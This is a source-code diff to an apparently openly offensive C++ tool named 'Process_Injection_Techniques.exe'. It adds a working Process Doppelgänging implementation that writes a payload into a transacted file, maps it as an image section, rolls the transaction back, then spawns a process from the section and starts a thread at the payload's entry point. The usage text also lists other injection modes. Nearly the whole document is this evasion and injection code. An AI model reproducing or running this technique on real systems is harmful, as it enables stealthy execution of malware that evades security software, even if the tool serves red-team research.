@@ -52,7 +52,8 @@ BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR 
 LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect);
 BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi);
 DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParameter);
-
+HANDLE MakeTransactedSection(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize);
+DWORD CreateProcessFromSecion(HANDLE hSection, BYTE* PayloadData, WCHAR* TargetProcessName);
 
 void PrintUsage() {
     printf("Usage: Process_Injection_Techniques.exe <Type of injection 1-9> <Flags>\n");
@@ -104,7 +105,9 @@ void PrintUsage() {
     printf("Note:The Dll Should Depend only on kernel32.dll and ntdll.dll for stability, as they are loaded at the same base address for all processes on the system, See Refrence[6] in the README for more info\n");
     printf("Process_Injection_Techniques.exe 13 -p <PID> -d <your payload path>\n\n");
 
-
+    printf("inject process inside other process using Process DoppelGanging\n");
+    printf("Note: it does not work on windows 10\n");
+    printf("Process_Injection_Techniques.exe 14 -n <Target Process name> -d <Your Executable Path>\n\n");
 }
 
 void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
@@ -211,6 +214,13 @@ void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
         ProcessID = _wtoi(argv[index]);
         index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
         wcscpy(DLLPath, argv[index]);
+        break;
+
+    case 14:
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
+        wcscpy(ProcessName, argv[index]);
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
+        wcscpy(SourceProcessName, argv[index]);
         break;
 
     default:
@@ -564,6 +574,7 @@ DWORD GetEntryPointRVA(BYTE* dwImageBase) {
         IMAGE_NT_HEADERS32* PayLoadNTheader32 = (IMAGE_NT_HEADERS32*)pSourceHeaders;
         EntryPointRVA = static_cast<ULONGLONG>(PayLoadNTheader32->OptionalHeader.AddressOfEntryPoint);
     }
+
     return EntryPointRVA;
 }
 
@@ -667,16 +678,17 @@ BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR 
     HMODULE hNTDLL = GetModuleHandleA("ntdll");
     _RtlCreateProcessParametersEx fnRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNTDLL, "RtlCreateProcessParametersEx");
 
-    
     UNICODE_STRING uTargetPath = { 0 };
     RtlInitUnicodeString(&uTargetPath, targetPath);
-    
+
     WCHAR DirPath[MAX_PATH] = { 0 };
     GetDirectoryFromPath(targetPath, DirPath, MAX_PATH);
+
     //if the directory is empty, set the current one
     if (wcsnlen(DirPath, MAX_PATH) == 0) {
         GetCurrentDirectoryW(MAX_PATH, DirPath);
     }
+
     UNICODE_STRING uCurrentDir = { 0 };
     RtlInitUnicodeString(&uCurrentDir, DirPath);
 
@@ -689,9 +701,14 @@ BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR 
     RtlInitUnicodeString(&uWindowName, windowName);
 
     LPVOID Environment;
-    CreateEnvironmentBlock(&Environment, NULL, TRUE);
+    BOOL ret = CreateEnvironmentBlock(&Environment, NULL, TRUE);
+    if (!ret) {
+        printf("failed CreateEnvironmentBlock Error Code is %x\n", GetLastError());
+        return -1;
+    }
 
     PRTL_USER_PROCESS_PARAMETERSMy params = nullptr;
+
     NTSTATUS status = fnRtlCreateProcessParametersEx(&params, (PUNICODE_STRING)&uTargetPath, (PUNICODE_STRING)&uDllDir, (PUNICODE_STRING)&uCurrentDir, (PUNICODE_STRING)&uTargetPath, Environment,
                                                     (PUNICODE_STRING)&uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED);
 
@@ -973,4 +990,101 @@ DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParame
     CloseHandle(hThread);
     
     return NULL;
+}
+
+HANDLE MakeTransactedSection(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize) {
+    DWORD options, isolationLvl, isolationFlags, timeout;
+    options = isolationLvl = isolationFlags = timeout = 0;
+
+    HMODULE hNTDLL = GetModuleHandleA("ntdll");
+    _NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection");
+
+    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
+    if (hTransaction == INVALID_HANDLE_VALUE) {
+        printf("Failed to create transaction! Error Code %x\n" ,GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    HANDLE hTransactedFile = CreateFileTransactedW(targetPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
+    if (hTransactedFile == INVALID_HANDLE_VALUE) {
+        printf("Failed to create transacted file Error Code %x\n ", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    DWORD writtenLen = 0;
+    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
+        printf("Failed writing payload! Error Code %x\n ", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    HANDLE hSection = nullptr;
+    NTSTATUS status  = fnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
+    if (status != 0) {
+        printf("Failed NtCreateSection  Error Code %x\n ", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+    CloseHandle(hTransactedFile);
+    hTransactedFile = nullptr;
+
+    if (RollbackTransaction(hTransaction) == FALSE) {
+        printf("Failed RollbackTransaction  Error Code %x\n ", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    CloseHandle(hTransaction);
+    hTransaction = nullptr;
+
+    return hSection;
+}
+
+
+DWORD CreateProcessFromSecion(HANDLE hSection, BYTE* PayloadData, WCHAR* TargetProcessName) {
+
+    HMODULE hNTDLL = GetModuleHandleA("ntdll");
+    _NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNTDLL, "NtCreateProcessEx");
+    _NtCreateThreadEx fnNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
+    _NtQueryInformationProcess fnNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
+    HANDLE hThread = NULL;
+    DWORD dwThreadId;
+    DWORD param = NULL;
+
+    HANDLE hProcess = nullptr;
+    NTSTATUS status = fnNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+    if (status != 0) {
+        printf("Failed in NtCreateProcessEx Error Code 0x%x\n ", GetLastError());
+        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
+            printf("[!] Failed The payload has mismatching bitness\n ");
+        }
+        return -1;
+    }
+
+    PROCESS_BASIC_INFORMATION pi = { 0 };
+
+    DWORD ReturnLength = 0;
+    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pi, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);
+    if (status != 0) {
+        printf("Failed in NtQueryInformationProcess Error Code 0x%x\n ", GetLastError());
+        return -1;
+    }
+
+   
+    PEBmy* PebCopy = ReadRemotePEB(hProcess);
+
+    ULONGLONG imageBase = (ULONGLONG)PebCopy->ImageBaseAddress;
+    DWORD payloadEntryPointRVA = GetEntryPointRVA(PayloadData);
+    ULONGLONG procEntry = payloadEntryPointRVA + imageBase;
+    
+
+    if (SetProcessParametar(hProcess, pi, TargetProcessName) == -1) {
+        printf("Failed in setuping Parameters Error Code 0x%x\n ", GetLastError());
+        return -1;
+    }
+    
+    status = fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)procEntry, NULL, FALSE, 0, 0, 0, NULL);
+    if (status != 0) {
+        printf("Failed in NtCreateThreadEx %x  Error Code 0x%x   %x\n ", hThread,GetLastError(), status);
+        return -1;
+    }
+
+    return 0;
 }
